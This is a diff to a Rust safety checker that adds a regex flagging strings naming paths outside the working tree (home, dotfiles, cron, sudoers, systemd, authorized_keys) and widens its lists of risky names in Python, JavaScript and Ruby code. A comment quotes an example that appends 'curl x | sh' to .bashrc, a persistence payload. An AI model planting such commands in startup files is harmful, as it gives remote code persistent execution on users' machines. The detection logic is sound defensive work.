@@ -698,6 +698,18 @@ fn data_literal_ranges(lang: Lang, code: &str) -> Option<Vec<(usize, usize)>> {
     Some(ranges)
 }
 
+/// Whether the text of a string names a place outside the working tree.
+fn names_a_place_outside_the_tree(text: &str) -> bool {
+    static PLACE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let place = PLACE.get_or_init(|| {
+        regex::Regex::new(
+            r"(?i)^\s*[/~]|\$\{?home\b|(?:^|[/\s])\.[a-z0-9_]|cron|sudoers|systemd|launchagents|launchdaemons|authorized_keys|rc\.local|profile|innerwarden",
+        )
+        .expect("valid regex")
+    });
+    place.is_match(text)
+}
+
 /// The names that, standing in code outside its strings, may start a
 /// process or run code in a way [`read_code`] does not account for.
 fn may_run_beyond_reading(lang: Lang, outside: &str) -> bool {
@@ -705,15 +717,15 @@ fn may_run_beyond_reading(lang: Lang, outside: &str) -> bool {
     let [python, js, ruby] = PATTERNS.get_or_init(|| {
         [
             regex::Regex::new(
-                r"\b(?:system|popen\w*|exec\w*|eval|spawn\w*|Popen|getoutput|getstatusoutput|check_output|check_call|run_path|run_module|import_module|__import__|getattr|setattr|globals|locals|vars|compile|__builtins__|builtins|fork\w*|breakpoint|subprocess|pty|commands|runpy|importlib|ctypes|cffi|pickle|marshal|dill|codeop|asyncio|multiprocessing|plumbum|pexpect|invoke|fabric|paramiko|webbrowser)\b|__\w+__|\bimport\s+(?:sh|code)\b|\bfrom\s+(?:sh|code)\s+import\b",
+                r"\b(?:system|popen\w*|exec\w*|eval|spawn\w*|Popen|getoutput|getstatusoutput|check_output|check_call|run_path|run_module|import_module|__import__|getattr|setattr|globals|locals|vars|compile|__builtins__|builtins|fork\w*|breakpoint|subprocess|pty|commands|runpy|importlib|ctypes|cffi|pickle|marshal|dill|codeop|asyncio|multiprocessing|plumbum|pexpect|invoke|fabric|paramiko|webbrowser|expanduser|expandvars|home|environ|getenv)\b|__\w+__|\bimport\s+(?:sh|code)\b|\bfrom\s+(?:sh|code)\s+import\b",
             )
             .expect("valid regex"),
             regex::Regex::new(
-                r"\b(?:child_process|exec\w*|spawn\w*|fork|eval|Function|vm|require|import|Deno|Bun|process|Worker|execa|shelljs|zx|globalThis|global|Reflect|constructor|module|dlopen)\b",
+                r"\b(?:child_process|exec\w*|spawn\w*|fork|eval|Function|vm|require|import|Deno|Bun|process|Worker|execa|shelljs|zx|globalThis|global|Reflect|constructor|module|dlopen|homedir|env|HOME)\b",
             )
             .expect("valid regex"),
             regex::Regex::new(
-                r"\b(?:system|exec|spawn|popen\w*|capture\w*|Open3|PTY|eval|instance_eval|class_eval|module_eval|instance_exec|class_exec|send|public_send|__send__|method|define_method|load|require\w*|fork|syscall|Kernel|IO|binding|ObjectSpace|const_get|Process|open)\b",
+                r"\b(?:system|exec|spawn|popen\w*|capture\w*|Open3|PTY|eval|instance_eval|class_eval|module_eval|instance_exec|class_exec|send|public_send|__send__|method|define_method|load|require\w*|fork|syscall|Kernel|IO|binding|ObjectSpace|const_get|Process|open|ENV|Dir|home|expand_path)\b",
             )
             .expect("valid regex"),
         ]
@@ -749,6 +761,17 @@ pub(crate) fn data_literals_blanked(
         return None;
     }
     let ranges = data_literal_ranges(lang, code)?;
+    // A string that names a place outside the working tree (an absolute
+    // path, the home, a dotfile, a scheduler or the sudo rules) may be the
+    // file the code writes, and what it writes there may run later: the
+    // line is read whole. `open('/home/u/.bashrc','a').write('curl x | sh')`
+    // was refused on main for the pipe to a shell it writes.
+    if ranges
+        .iter()
+        .any(|&(start, end)| names_a_place_outside_the_tree(&code[start..end]))
+    {
+        return None;
+    }
     let mut blanked = String::with_capacity(code.len());
     let mut outside = String::with_capacity(code.len());
     let mut last = 0;
